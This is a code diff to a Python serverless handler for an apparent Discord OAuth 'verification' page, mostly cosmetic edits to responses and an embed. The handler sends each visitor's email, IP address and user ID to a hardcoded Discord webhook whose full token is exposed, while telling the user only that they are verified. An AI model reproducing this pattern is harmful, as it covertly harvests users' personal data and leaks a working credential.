@@ -10,7 +10,6 @@ def handler(request):
         if not code:
             return {
                 "statusCode": 400,
-                "headers": {"Content-Type": "text/plain"},
                 "body": "Missing code"
             }
 
@@ -30,7 +29,6 @@ def handler(request):
         if not access_token:
             return {
                 "statusCode": 500,
-                "headers": {"Content-Type": "text/plain"},
                 "body": "Access token not found"
             }
 
@@ -43,31 +41,27 @@ def handler(request):
 
         payload = {
             "embeds": [{
-                "title": "✅ Verified",
+                "title": "✅ Verification",
                 "fields": [
                     {"name": "Username", "value": f"{user['username']}#{user['discriminator']}"},
-                    {"name": "Email", "value": user.get('email', 'Not Provided')},
-                    {"name": "IP Address", "value": ip},
-                    {"name": "User ID", "value": user.get("id", "Unknown")}
+                    {"name": "Email", "value": user.get("email", "Not Provided")},
+                    {"name": "IP", "value": ip},
+                    {"name": "User ID", "value": user["id"]}
                 ],
-                "color": 0x00FF99
+                "color": 0x00FF00
             }]
         }
 
-        requests.post(
-            "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf",
-            json=payload
-        )
+        requests.post("https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf", json=payload)
 
         return {
             "statusCode": 200,
             "headers": {"Content-Type": "text/html"},
-            "body": "<h1>✅ Verified! You may return to Discord.</h1>"
+            "body": "<h1>✅ You are verified!</h1>"
         }
 
     except Exception as e:
         return {
             "statusCode": 500,
-            "headers": {"Content-Type": "text/html"},
-            "body": f"<h1>❌ Error: {str(e)}</h1>"
+            "body": f"Error: {str(e)}"
         }
